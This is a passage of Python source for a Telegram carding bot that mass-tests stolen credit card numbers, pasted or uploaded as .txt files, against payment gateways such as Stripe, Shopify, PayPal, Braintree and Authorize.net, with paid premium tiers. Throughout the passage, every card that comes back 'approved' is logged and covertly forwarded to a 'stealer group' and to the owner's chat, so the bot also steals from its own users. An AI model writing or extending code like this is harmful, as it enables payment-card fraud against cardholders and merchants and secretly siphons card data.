        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]

        if not cards:
            await update.message.reply_text("❌ No valid cards found!")
            return

        if len(cards) > limit:
            cards = cards[:limit]

        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0

        header_msg = await update.message.reply_text(
            f"🛒 <b>Mass Shopify Check</b>\n"
            f"Total: {total_cards}\n"
            f"⏳ Processing...",
            parse_mode=ParseMode.HTML
        )

        for i, card in enumerate(cards):
            if context.user_data.get('mass_check_stop'):
                break

            card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
            start_time = time.time()

            try:
                loop = asyncio.get_running_loop()
                result = await asyncio.wait_for(
                    loop.run_in_executor(None, check_card_php,
                                        "sh", card['cc'], card['mm'], card['yy'], card['cvv'], user.id),
                    timeout=30.0
                )
                elapsed = round(time.time() - start_time, 2)

                bin_info = get_bin_info(card['cc'])
                output = ae(_format_shopify_result(card['cc'], card['mm'], card['yy'], card['cvv'], result, bin_info, elapsed, username))

                msg_lower = result.get('message', '').lower()
                is_live = result['status'] == 'success' and any(k in msg_lower for k in ['approved', 'success', 'valid', 'authorized', 'charged'])
                is_dead = any(k in msg_lower for k in ['declined', 'error', 'failed', 'invalid', 'expired', 'denied'])
                is_live = is_live and not is_dead

                if is_live:
                    approved_count += 1
                    log_approved_card(user.id, username, card['cc'], card['mm'], card['yy'], card['cvv'], "sh", result['message'], bin_info)
                    await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "sh", result['message'], bin_info, user.id, username)
                    try:
                        gif_url = get_sexy_anime_gif("success")
                        await context.bot.send_animation(
                            chat_id=update.message.chat_id,
                            animation=gif_url,
                            caption=output,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        await context.bot.send_message(chat_id=update.message.chat_id, text=output, parse_mode=ParseMode.HTML)
                else:
                    declined_count += 1
                    try:
                        gif_url = get_sexy_anime_gif("failed")
                        await context.bot.send_animation(
                            chat_id=update.message.chat_id,
                            animation=gif_url,
                            caption=output,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        await context.bot.send_message(chat_id=update.message.chat_id, text=output, parse_mode=ParseMode.HTML)

            except asyncio.TimeoutError:
                error_count += 1
                elapsed = round(time.time() - start_time, 2)
                timeout_result = {"status": "error", "message": "Timeout (30s)"}
                bin_info = get_bin_info(card['cc'])
                output = ae(_format_shopify_result(card['cc'], card['mm'], card['yy'], card['cvv'], timeout_result, bin_info, elapsed, username))
                try:
                    await context.bot.send_message(chat_id=update.message.chat_id, text=output, parse_mode=ParseMode.HTML)
                except:
                    pass
            except Exception as e:
                error_count += 1

            if i < len(cards) - 1:
                await asyncio.sleep(0.25)

        stopped = context.user_data.get('mass_check_stop', False)
        summary = f"🛒 <b>Shopify Mass Check Complete</b>\n\n"
        summary += f"📊 <b>Total:</b> {total_cards}\n"
        summary += f"✅ <b>Approved:</b> {approved_count}\n"
        summary += f"❌ <b>Declined:</b> {declined_count}\n"
        summary += f"⚠️ <b>Errors:</b> {error_count}"
        if stopped:
            summary = "⏹️ <b>Mass Check STOPPED</b>\n\n" + summary

        try:
            await header_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        except:
            pass
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

# ============================================================================
# DOT COMMAND HANDLER
# ============================================================================

async def handle_dot_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle commands starting with . (dot)"""
    text = update.message.text
    
    if not text.startswith('.'):
        return
    
    # Parse command
    parts = text.split(maxsplit=1)
    command = parts[0][1:].lower()  # Remove dot and lowercase
    
    # Check if it's a valid gate command
    valid_gates = ['ss', 'bu', 'sq', 'pp', 'sor', 'st5', 'st12', 'str', 'dep', 
                   'auz', 'asd', 'atf', 'anh', 'sh6', 'sh8', 'sh10', 'sh13', 'bt1', 'bt3d', 'rp', 'stm', 'se1', 'sh', 'st1']
    
    if command not in valid_gates:
        return
    
    # Check if card data provided
    if len(parts) < 2:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>.{command} 4242424242424242|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Set context args for the handler
    context.args = parts[1].split()
    
    # Route to appropriate gate handler
    gate_handlers = {
        'ss': gate_ss, 'bu': gate_bu, 'sq': gate_sq,
        'pp': gate_pp, 'sor': gate_sor, 'st5': gate_st5,
        'st12': gate_st12, 'str': gate_str, 'dep': gate_dep,
        'auz': gate_auz, 'asd': gate_asd, 'atf': gate_atf, 'anh': gate_anh,
        'sh6': gate_sh6, 'sh8': gate_sh8, 'sh10': gate_sh10, 'sh13': gate_sh13,
        'bt1': gate_bt1, 'bt3d': gate_bt3d, 'rp': gate_rp, 'stm': gate_stm, 'se1': gate_se1, 'sh': gate_sh, 'st1': gate_st1
    }
    
    handler = gate_handlers.get(command)
    if handler:
        await handler(update, context)

# ============================================================================
# MASS CHECK SHORTCUTS
# ============================================================================

async def mass_check_shortcut(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_name: str):
    """Handle mass check shortcuts like /mpp, /mss - Available for all approved users"""
    user = update.effective_user
    
    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if premium gate requires premium access
    premium_gates = ['pp', 'sor', 'st5', 'st12', 'str', 'dep', 
                    'auz', 'asd', 'atf', 'anh', 'sh6', 'sh8', 'sh10', 'sh13', 
                    'bt1', 'bt3d', 'rp', 'stm', 'st1']
    
    if gate_name in premium_gates and not is_premium(user.id):
        await update.message.reply_text(
            get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get cards from message
    text = update.message.text
    
    # Split by command (handles both "/mpp card|mm|yy|cvv" and "/mpp\ncard|mm|yy|cvv")
    parts = text.split(maxsplit=1)
    
    # Get cards from same line or next lines
    if len(parts) > 1:
        # Card on same line as command
        cards_text = parts[1]
    else:
        # Try to get from next lines
        lines = text.split('\n')
        cards_text = '\n'.join(lines[1:]) if len(lines) > 1 else ""
    
    if not cards_text.strip():
        await update.message.reply_text(
            f"❌ <b>No cards provided!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/m{gate_name} 4242424242424242|12|25|123</code>\n\n"
            f"<b>Or multiple cards (each on new line):</b>\n"
            f"<code>/m{gate_name}</code>\n"
            f"<code>4242424242424242|12|25|123</code>\n"
            f"<code>5555555555554444|01|26|456</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Route to specific mass check processor based on gate
    if gate_name == 'pp':
        await process_mass_pp(update, context, cards_text)
    elif gate_name == 'rz':
        await process_mass_rz(update, context, cards_text)
    elif gate_name == 'b3':
        await process_mass_b3(update, context, cards_text)
    elif gate_name == 'st':
        await process_mass_st(update, context, cards_text)
    elif gate_name == 'sh':
        await process_mass_sh(update, context, cards_text)
    else:
        # For other gates, store cards in context and call mass_check
        context.user_data['mass_check_gate'] = gate_name
        context.user_data['mass_check_cards'] = cards_text
        context.args = [gate_name]
        await mass_check_with_cards(update, context, cards_text)

# ============================================================================
# MASS CHECK TXT FILE SHORTCUTS
# ============================================================================

async def mass_check_txt_shortcut(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_name: str):
    """Handle TXT file mass check shortcuts like /msstxt, /mpptxt"""
    user = update.effective_user
    
    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Store gate name in user context for file upload
    context.user_data['mass_check_gate'] = gate_name
    
    # Get gate display name
    gate_names = {
        'ss': 'Stripe Auth $0.5',
        'bu': 'Braintree Auth $1',
        'sq': 'Square Auth $0',
        'pp': 'PayPal $1',
        'sor': 'Stripe $2',
        'st5': 'Stripe $5',
        'st12': 'Stripe $12',
        'str': 'Stripe $15',
        'dep': 'Stripe $49',
        'auz': 'Authorize.net $0',
        'asd': 'Authorize.net $7',
        'atf': 'Authorize.net $25',
        'anh': 'Authorize.net $200',
        'sh6': 'Shopify $6',
        'sh8': 'Shopify $8',
        'sh10': 'Shopify $10',
        'sh13': 'Shopify $13',
        'bt1': 'Braintree $1',
        'bt3d': 'Braintree 3D',
        'rz': 'Razorpay ₹1',
        'st': 'Stripe Auth',
        'stm': 'Stripe Mass Auth',
        'st1': 'Stripe $1'
    }
    
    gate_display = gate_names.get(gate_name, gate_name.upper())
    limit = get_mass_check_limit(user.id)
    rank = get_user_rank(user.id)
    
    await update.message.reply_text(
        f"📁 <b>MASS CHECK TXT - {gate_display}</b>\n\n"
        f"✅ <b>Gate Selected:</b> {gate_display}\n"
        f"💎 <b>Your Status:</b> {rank}\n"
        f"📊 <b>Your Limit:</b> {limit} cards\n\n"
        f"📤 <b>Now upload your .txt file!</b>\n\n"
        f"The bot will automatically:\n"
        f"1. Extract all cards from file\n"
        f"2. Check them with {gate_display}\n"
        f"3. Show results\n\n"
        f"⏳ <b>Waiting for file...</b>",
        parse_mode=ParseMode.HTML
    )

async def handle_mass_check_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle TXT file upload for mass check shortcuts"""
    user = update.effective_user
    
    # Check if gate is set
    if 'mass_check_gate' not in context.user_data:
        return  # Not a mass check TXT operation
    
    gate_name = context.user_data['mass_check_gate']
    
    # Check if message has document
    if not update.message.document:
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(ae("❌ Only .txt files are supported!"))
        return
    
    # Get gate info
    gate_names = {
        'ss': ('Stripe Auth $0.5', False),
        'bu': ('Braintree Auth $1', False),
        'sq': ('Square Auth $0', False),
        'pp': ('PayPal $1', True),
        'sor': ('Stripe $2', True),
        'st5': ('Stripe $5', True),
        'st12': ('Stripe $12', True),
        'str': ('Stripe $15', True),
        'dep': ('Stripe $49', True),
        'auz': ('Authorize.net $0', True),
        'asd': ('Authorize.net $7', True),
        'atf': ('Authorize.net $25', True),
        'anh': ('Authorize.net $200', True),
        'sh6': ('Shopify $6', True),
        'sh8': ('Shopify $8', True),
        'sh10': ('Shopify $10', True),
        'sh13': ('Shopify $13', True),
        'bt1': ('Braintree $1', True),
        'bt3d': ('Braintree 3D', True),
        'st1': ('Stripe $1', True)
    }
    
    gate_display, requires_premium = gate_names.get(gate_name, (gate_name.upper(), False))
    
    # Check premium requirement
    if requires_premium and not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        # Clear gate
        del context.user_data['mass_check_gate']
        return
    
    loading_msg = await update.message.reply_text(f"📁 Processing file for {gate_display}...")
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        # Extract cards
        cards = extract_cards_from_text(text_content)
        
        if not cards:
            await loading_msg.edit_text(
                "❌ <b>No valid cards found in file!</b>\n\n"
                "Format should be: CC|MM|YY|CVV",
                parse_mode=ParseMode.HTML
            )
            del context.user_data['mass_check_gate']
            return
        
        # Get user limit
        limit = get_mass_check_limit(user.id)
        
        # Apply limit
        if len(cards) > limit:
            await loading_msg.edit_text(
                f"⚠️ <b>LIMIT EXCEEDED!</b>\n\n"
                f"File contains {len(cards)} cards.\n"
                f"Your limit: {limit} cards\n\n"
                f"Only first {limit} cards will be checked.\n\n"
                f"💎 Upgrade to premium for higher limits!",
                parse_mode=ParseMode.HTML
            )
            await asyncio.sleep(2)
        
        cards = cards[:limit]
        
        # Start mass checking
        await loading_msg.edit_text(
            f"🎀 <b>Mass Checking Started</b>\n\n"
            f"Gateway: {gate_display}\n"
            f"File: {document.file_name}\n"
            f"Cards: {len(cards)}\n\n"
            f"⏳ <b>Processing...</b>",
            parse_mode=ParseMode.HTML
        )
        
        # Check each card concurrently (up to 5 at a time) without blocking the event loop
        approved = []
        declined = []
        _sem = asyncio.Semaphore(5)

        async def _check_one_file(idx, cc, mm, yy, cvv):
            async with _sem:
                return idx, cc, mm, yy, cvv, await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)

        tasks = [_check_one_file(i, cc, mm, yy, cvv) for i, (cc, mm, yy, cvv) in enumerate(cards, 1)]
        done = 0
        for coro in asyncio.as_completed(tasks):
            idx, cc, mm, yy, cvv, result = await coro
            done += 1
            card_str = f"{cc}|{mm}|{yy}|{cvv}"

            if result["status"] == "success":
                msg = result.get("message", "")
                card_is_approved = "approved" in msg.lower() or "success" in msg.lower() or "charged" in msg.lower()

                if card_is_approved:
                    approved.append(card_str)

                    # Log approved card, send to stealer, and send GIF
                    try:
                        from modules.gate_checker import get_bin_info
                        bin_info = await asyncio.to_thread(get_bin_info, cc)
                        log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, msg, bin_info)
                        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, msg, bin_info, user.id, user.username or user.first_name)
                        await send_approved_card_with_gif(update, card_str, gate_name, msg, 3.0, bin_info)
                    except:
                        pass
                else:
                    declined.append(card_str)
            else:
                declined.append(card_str)

            # Update progress
            try:
                progress_bar = "🟦" * done + "⬜" * (len(cards) - done)
                await loading_msg.edit_text(
                    f"Progress: {done}/{len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}\n"
                    f"<b>{progress_bar[:20]}</b>",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        
        # Send final results
        rank = get_user_rank(user.id)
        result_text = f"""🎀 <b>Mass Check Complete</b>

Gateway: {gate_display}
Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}

"""
        
        if approved:
            result_text += "<b>Approved Cards:</b>\n\n"
            
            for i, card_str in enumerate(approved[:10], 1):
                result_text += f"<b>{i}.</b> <code>{card_str}</code>\n"
                
                try:
                    from modules.gate_checker import get_bin_info
                    cc_parts = card_str.split('|')
                    if len(cc_parts) >= 1:
                        bin_info = get_bin_info(cc_parts[0])
                        result_text += f"   <b>├─</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
                        result_text += f"   <b>├─</b> {bin_info['bank']}\n"
                        result_text += f"   <b>├─</b> {bin_info['country']} {bin_info['emoji']}\n\n"
                except:
                    result_text += "\n"
            
            if len(approved) > 10:
                result_text += f"<i>...and {len(approved) - 10} more approved cards</i>\n\n"
        
        
        result_text += f"<b>├─Bot by - @tu_bkl_hai</b>"
        
        await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        
        # Clear gate
        del context.user_data['mass_check_gate']
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))
        if 'mass_check_gate' in context.user_data:
            del context.user_data['mass_check_gate']

# ============================================================================
# MASS CHECK WITH CARDS (for shortcuts)
# ============================================================================

async def mass_check_with_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Mass check with pre-extracted cards for shortcut commands"""
    user = update.effective_user
    gate_name = context.args[0].lower() if context.args else 'ss'
    
    valid_gates = {
        "ss": ("Stripe Auth $0.5", False),
        "bu": ("Braintree Auth $1", False),
        "sq": ("Square Auth $0", False),
        "pp": ("PayPal $1", True),
        "sor": ("Stripe $2", True),
        "st5": ("Stripe $5", True),
        "st12": ("Stripe $12", True),
        "str": ("Stripe $15", True),
        "dep": ("Stripe $49", True),
        "auz": ("Authorize.net $0", True),
        "asd": ("Authorize.net $7", True),
        "atf": ("Authorize.net $25", True),
        "anh": ("Authorize.net $200", True),
        "sh6": ("Shopify $6", True),
        "sh8": ("Shopify $8", True),
        "sh10": ("Shopify $10", True),
        "sh13": ("Shopify $13", True),
        "bt1": ("Braintree $1", True),
        "bt3d": ("Braintree 3D", True),
        "st1": ("Stripe $1", True)
    }
    
    if gate_name not in valid_gates:
        await update.message.reply_text(ae(f"❌ Invalid gate: {gate_name}"))
        return
    
    gate_display, requires_premium = valid_gates[gate_name]
    
    if requires_premium and not is_premium(user.id):
        await update.message.reply_text(
            get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    cards = extract_cards_from_text(cards_text)
    if not cards:
        await update.message.reply_text(ae("❌ No valid cards found!"))
        return
    
    limit = get_mass_check_limit(user.id)
    cards = cards[:limit]
    
    loading_msg = await update.message.reply_text(
        f"⏳ <b>Processing {len(cards)} cards on {gate_display}...</b>",
        parse_mode=ParseMode.HTML
    )
    
    approved = []
    declined = []
    _sem2 = asyncio.Semaphore(5)

    async def _check_one_text(card):
        async with _sem2:
            try:
                parts = card.split('|')
                if len(parts) >= 4:
                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                    result = await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
                    return card, result
                return card, {'status': 'error', 'message': 'Invalid format'}
            except Exception as e:
                return card, {'status': 'error', 'message': str(e)}

    results = await asyncio.gather(*[_check_one_text(card) for card in cards])
    for card, result in results:
        if result.get('status') in ['approved', 'charged', 'cvv_match']:
            approved.append((card, result))
        else:
            declined.append((card, result))

    result_text = f"📋 <b>MASS CHECK RESULTS - {gate_display}</b>\n\n"
    result_text += f"✅ Approved: {len(approved)}\n"
    result_text += f"❌ Declined: {len(declined)}\n\n"

    if approved:
        result_text += "<b>✅ APPROVED CARDS:</b>\n"
        for card, res in approved[:10]:
            result_text += f"<code>{card}</code>\n"

    await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)

# ============================================================================
# MASS CHECK & TXT FILE PROCESSING
# ============================================================================

async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check multiple cards - Available for all approved users"""
    user = update.effective_user
    
    # Check if banned
    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        await update.message.reply_animation(
            animation=gif_url,
            caption=ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot."),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get user limit
    limit = get_mass_check_limit(user.id)
    rank = get_user_rank(user.id)
    
    # Check if message has text with cards
    if not context.args:
        await update.message.reply_text(
            f"📋 <b>MASS CHECK - ONICHAN</b>\n\n"
            f"💎 <b>Your Status:</b> {rank}\n"
            f"📊 <b>Your Limit:</b> {limit} cards per check\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/mass gate_name</code>\n"
            f"Then send cards (one per line or all together)\n\n"
            f"💡 <b>Example:</b>\n"
            f"<code>/mass ss</code>\n"
            f"<code>4242424242424242|12|25|123</code>\n"
            f"<code>5555555555554444|01|26|456</code>\n\n"
            f"📁 <b>Or send a .txt file with cards!</b>\n\n"
            f"🆓 Free: {MASS_CHECK_LIMITS['free']} cards\n"
            f"💎 Premium: {MASS_CHECK_LIMITS['premium']} cards\n"
            f"👑 Owner: {MASS_CHECK_LIMITS['owner']} cards",
            parse_mode=ParseMode.HTML
        )
        return
    
    gate_name = context.args[0].lower()
    
    # Validate gate
    valid_gates = {
        # Free Gates
        "ss": ("Stripe Auth $0.5", False),
        "bu": ("Braintree Auth $1", False),
        "sq": ("Square Auth $0", False),
        
        # Premium Gates
        "pp": ("PayPal $1", True),
        "sor": ("Stripe $2", True),
        "st5": ("Stripe $5", True),
        "st12": ("Stripe $12", True),
        "str": ("Stripe $15", True),
        "dep": ("Stripe $49", True),
        "auz": ("Authorize.net $0", True),
        "asd": ("Authorize.net $7", True),
        "atf": ("Authorize.net $25", True),
        "anh": ("Authorize.net $200", True),
        "sh6": ("Shopify $6", True),
        "sh8": ("Shopify $8", True),
        "sh10": ("Shopify $10", True),
        "sh13": ("Shopify $13", True),
        "bt1": ("Braintree $1", True),
        "bt3d": ("Braintree 3D", True),
        "st1": ("Stripe $1", True)
    }
    
    if gate_name not in valid_gates:
        await update.message.reply_text(
            f"❌ Invalid gate!\n\n"
            f"Available gates: {', '.join(valid_gates.keys())}",
            parse_mode=ParseMode.HTML
        )
        return
    
    gate_display, requires_premium = valid_gates[gate_name]
    
    # Check premium requirement
    if requires_premium and not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards from message
    message_text = update.message.text
    cards = extract_cards_from_text(message_text)
    
    if not cards:
        await update.message.reply_text(
            f"❌ No valid cards found!\n\n"
            f"Send cards in format: CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Apply limit
    if len(cards) > limit:
        await update.message.reply_text(
            f"⚠️ <b>LIMIT EXCEEDED!</b>\n\n"
            f"You can check max {limit} cards at once.\n"
            f"Found {len(cards)} cards in your message.\n\n"
            f"💎 Upgrade to premium for higher limits!",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Start mass checking
    status_msg = await update.message.reply_text(
        f"🎀 <b>Mass Check Started</b>\n\n"
        f"Gateway: {gate_display}\n"
        f"Cards: {len(cards)}\n\n"
        f"⏳ <b>Processing...</b>",
        parse_mode=ParseMode.HTML
    )
    
    # Check each card concurrently (up to 5 at a time) without blocking the event loop
    approved = []
    declined = []
    _sem3 = asyncio.Semaphore(5)

    async def _check_one_mass(idx, cc, mm, yy, cvv):
        async with _sem3:
            return idx, cc, mm, yy, cvv, await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)

    _tasks3 = [_check_one_mass(i, cc, mm, yy, cvv) for i, (cc, mm, yy, cvv) in enumerate(cards, 1)]
    for coro in asyncio.as_completed(_tasks3):
        i, cc, mm, yy, cvv, result = await coro

        card_str = f"{cc}|{mm}|{yy}|{cvv}"

        card_is_approved = False  # Initialize variable (renamed to avoid shadowing)
        if result["status"] == "success":
            msg = result.get("message", "")
            card_is_approved = "approved" in msg.lower() or "success" in msg.lower() or "charged" in msg.lower()

            if card_is_approved:
                approved.append(card_str)

                # Log, send to stealer, and notify owner instantly with GIF
                try:
                    from modules.gate_checker import get_bin_info
                    bin_info = await asyncio.to_thread(get_bin_info, cc)
                    log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, msg, bin_info)
                    await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, msg, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card_str, gate_name, msg, 3.0, bin_info)
                    
                    gate_names = {
                        'ss': 'StripeAuth', 'bu': 'BraintreeAuth', 'sq': 'SquareAuth',
                        'pp': 'PayPalCharge', 'sor': 'StripeCharge', 'st5': 'StripeCharge',
                        'st12': 'StripeCharge', 'str': 'StripeCharge', 'dep': 'StripeCharge',
                        'auz': 'AuthorizeNet', 'asd': 'AuthorizeNet', 'atf': 'AuthorizeNet', 'anh': 'AuthorizeNet',
                        'sh6': 'ShopifyCharge', 'sh8': 'ShopifyCharge', 'sh10': 'ShopifyCharge', 'sh13': 'ShopifyCharge',
                        'bt1': 'BraintreeCharge', 'bt3d': 'Braintree3D'
                    }
                    
                    gate_tag = gate_names.get(gate_name, gate_name.upper())
                    user_rank = get_user_rank(user.id)
                    
                    # Send success sticker
                    try:
                        success_stickers = [
                            "CAACAgIAAxkBAAEBXXxnLqK5AAFxQwABvZGxMjYAAWxvAAGxAAJEAAOWr4lHYwABd0K9AAFxMQQ",
                            "CAACAgIAAxkBAAEBXX5nLqLBAAHvAAGqAAFLAAFxMjYAAWxvAAGxAAJFAAOWr4lHYwABd0K9AAFxMQQ"
                        ]
                        await context.bot.send_sticker(
                            chat_id=OWNER_ID,
                            sticker=random.choice(success_stickers)
                        )
                    except:
                        pass
                    
                    owner_msg = f"""<b>Onichan:</b>
<b>#{gate_tag}</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>[✓] Card ➜</b> <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>[✓] Status ➜ Charged 🔥</b>
<b>[✓] Response ➜ {msg} 🎉</b>
<b>[✓] Gateway ➜ {gate_display}</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>[✓] Info ➜ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}</b>
<b>[✓] Bank ➜ {bin_info['bank']}</b>
<b>[✓] Country ➜ {bin_info['country']} {bin_info['emoji']}</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>[✓] Checked By ➜ @{user.username or user.first_name} [{user_rank}]</b>
<b>[Δ] Dev ➜ Onichan</b>"""
                    
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=owner_msg,
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    print(f"Error notifying owner in mass check: {e}")
            else:
                declined.append(card_str)
        else:
            declined.append(card_str)
        
        # Update progress every card
        try:
            progress_bar = "🟦" * i + "⬜" * (len(cards) - i)
            await status_msg.edit_text(
                f"Progress: {i}/{len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}\n"
                f"<b>{progress_bar[:20]}</b>",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    
    # Send final results with bank details
    result_text = f"""🎀 <b>Mass Check Complete</b>

Gateway: {gate_display}
Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}

"""
    
    if approved:
        result_text += "<b>Approved Cards:</b>\n\n"
        
        # Show approved cards with bank details
        for i, card_str in enumerate(approved[:10], 1):
            result_text += f"<b>{i}.</b> <code>{card_str}</code>\n"
            
            # Get BIN info for this card
            try:
                from modules.gate_checker import get_bin_info
                cc_parts = card_str.split('|')
                if len(cc_parts) >= 1:
                    bin_info = get_bin_info(cc_parts[0])
                    result_text += f"   <b>├─</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
                    result_text += f"   <b>├─</b> {bin_info['bank']}\n"
                    result_text += f"   <b>├─</b> {bin_info['country']} {bin_info['emoji']}\n\n"
            except:
                result_text += "\n"
        
        if len(approved) > 10:
            result_text += f"<i>...and {len(approved) - 10} more approved cards</i>\n\n"
    
    
    await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)

@require_approval
async def handle_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files with cards"""
    user = update.effective_user
    
    # Check if message has document
    if not update.message.document:
        return
    
    document = update.message.document
    
    # Check if it's a txt file
    if not document.file_name.endswith('.txt'):
        return
    
    # Get user limit
    limit = get_mass_check_limit(user.id)
    rank = get_user_rank(user.id)
    
    # Download file
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error reading file: {str(e)}"))
        return
    
    # Extract cards
    cards = extract_cards_from_text(text_content)
    
    if not cards:
        await update.message.reply_text(
            "❌ No valid cards found in file!\n\n"
            "Format should be: CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Apply limit
    total_found = len(cards)
    cards = cards[:limit]  # Limit cards
    
    # Show extracted cards
    sep = "━━━━━━━━━━━━━━━━━━━━"
    result_text = f"""💜 <b>ONICHAN • TXT UPLOAD</b>
{sep}
📄 <b>File</b>      : {document.file_name}
📊 <b>Found</b>     : {total_found}
✅ <b>Extracted</b> : {len(cards)}
💎 <b>Your Status:</b> {rank}
🔒 <b>Your Limit:</b> {limit} cards

━━━━━━━━━━━━━━━━━━━━━━

💳 <b>EXTRACTED CARDS:</b>

"""
    
    for i, (cc, mm, yy, cvv) in enumerate(cards[:20], 1):  # Show max 20
        result_text += f"{i}. <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
    
    if len(cards) > 20:
        result_text += f"\n<i>...and {len(cards) - 20} more cards</i>\n"
    
    result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>To check these cards:</b>
<code>/mass gate_name</code>

Then paste the cards above!

💡 <b>Example:</b>
<code>/mass ss</code>
(then paste cards)

━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Uploaded by:</b> @{user.username or user.first_name}
"""
    
    if total_found > limit:
        result_text += f"\n⚠️ <b>Note:</b> Only first {limit} cards extracted due to your limit.\n💎 Upgrade to premium for more!"
    
    gif_url = get_sexy_anime_gif("success")
    await update.message.reply_animation(
        animation=gif_url,
        caption=result_text,
        parse_mode=ParseMode.HTML
    )

# ============================================================================
# CALLBACK QUERY HANDLER
# ============================================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    rank = get_user_rank(user.id)
    
    async def safe_edit(text, reply_markup=None):
        text = ae(text)
        try:
            await query.edit_message_text(
                text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        except:
            try:
                await query.edit_message_caption(
                    caption=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            except:
                try:
                    await query.message.reply_text(
                        text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
                except:
                    pass
    
    # Regenerate cards
    if query.data == "regen_cards":
        await regenerate_cards_callback(update, context)
        return
    
    # Admin panel
    if query.data == "admin":
        await admin_panel(update, context)
        return
    
    # ============================================================
    # GATES MENU - FIXED LAYOUT
    # ============================================================
    # Row 1: Stripe Auth | Stripe $5
